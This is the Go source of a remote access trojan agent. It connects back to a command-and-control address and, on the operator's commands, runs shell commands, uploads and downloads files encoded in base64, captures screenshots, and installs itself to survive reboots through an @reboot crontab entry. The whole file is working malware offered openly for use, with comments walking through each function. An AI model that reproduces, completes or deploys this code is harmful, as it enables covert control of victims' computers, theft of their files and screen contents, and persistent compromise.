package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"image/png"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/kbinani/screenshot"
)

const C2 string = "127.0.0.1:1337"

func main() {
	connection := connect_home()

	// Read input
	for {
		// Its going to read upto a new line character. [*Tip - use single quotes for special characters]
		cmd, _ := bufio.NewReader(connection).ReadString('\n')
		cmd = strings.TrimSpace(cmd)

		if len(cmd) == 0 {
			send_resp(connection, exec_command(cmd))
		}else if cmd == "quit" || cmd == "q" {
		// quit
			send_resp(connection, "Closing connection!")
			connection.Close()
			break
		} else if cmd[0:2] == "cd" {
			// 2 possibilities : cd, cd target_directory
			if cmd == "cd" {
				cwd, err := os.Getwd()
				if err != nil {
					send_resp(connection, err.Error())
				} else {
					send_resp(connection, cwd)
				}
			} else {
				target_directory := strings.Split(cmd, " ")[1]
				if err := os.Chdir(target_directory); err != nil {
					send_resp(connection, err.Error())
				} else {
					send_resp(connection, target_directory)
				}
			}
		} else if strings.Contains(cmd, ":") {
			// upload file
			tmp := strings.Split(cmd, ":")
			if save_file(tmp[0], tmp[1]) {
				send_resp(connection, "File uploaded successfully!")
			} else {
				send_resp(connection, "Error uploading file")
			}
		} else if tmp := strings.Split(cmd, " "); tmp[0] == "download" {
			// download file
			send_resp(connection, get_file(tmp[1]))
		} else if cmd == "screenshot" {
			send_resp(connection, take_screenshot())
		} else if cmd == "persist" {
			send_resp(connection, persist())
		} else {
			send_resp(connection, exec_command(cmd))
		}
	}
}

// c2 connect back to the server
func connect_home() net.Conn {
	home_connection, err := net.Dial("tcp", C2)
	if err != nil {
		// if there's an error, we sleep for 30s and try to connect back again
		time.Sleep(time.Second * 30)
		return connect_home()
	}
	return home_connection
}

// send response
func send_resp(connection net.Conn, message string) {
	// fprintf formats according to a format specifier and writes to a writer
	fmt.Fprintf(connection, "%s\n", message)
}

// upload file & save it (parameters are [filename, base64 string]) - function will return a boolean
func save_file(filename string, b64_string string) bool {
	// remember the base64 string will come in as a byte string so to remove first b' and last ' we do this:
	tmp := b64_string[2 : len(b64_string)-1]
	content, _ := base64.StdEncoding.DecodeString(tmp)
	if err := os.WriteFile(filename, content, 0644); err != nil {
		return false
	}
	return true
}

// get file to download it
func get_file(filename string) string {
	if !file_exists(filename) {
		return "File not found!"
	} else {
		return filename + ":" + file_b64(filename)
	}
}

// check if file exists
func file_exists(filename string) bool {
	if _, err := os.Stat(filename); err != nil {
		return false
	}
	return true
}

// return base64 string of file contents
func file_b64(filename string) string {
	content, _ := os.ReadFile(filename)
	return base64.StdEncoding.EncodeToString(content)
}

// take screenshot func using a third party package.
func take_screenshot() string {
	bounds := screenshot.GetDisplayBounds(0)
	image, _ := screenshot.CaptureRect(bounds)
	file, _ := os.Create("wallpaper.png")
	// close file when function exits
	defer file.Close()
	png.Encode(file, image)
	b64_string := file_b64("wallpaper.png")
	os.Remove("wallpaper.png")
	return b64_string
}

// persistence
func persist() string {
	filename := "/tmp/persist"
	file, _ := os.Create(filename)
	exec_path, _ := os.Executable()
	fmt.Fprintf(file, "@reboot %s\n", exec_path)
	_, err := exec.Command("/usr/bin/crontab", filename).CombinedOutput()
	os.Remove(filename)
	if err != nil {
		return "Error establishing Persistence"
	}
	return "Persistence established successfully"
}

// execute shell commands
func exec_command(cmd string) string {
	output, err := exec.Command(cmd).Output()
	if err != nil {
		return err.Error()
	}
	return string(output)
}
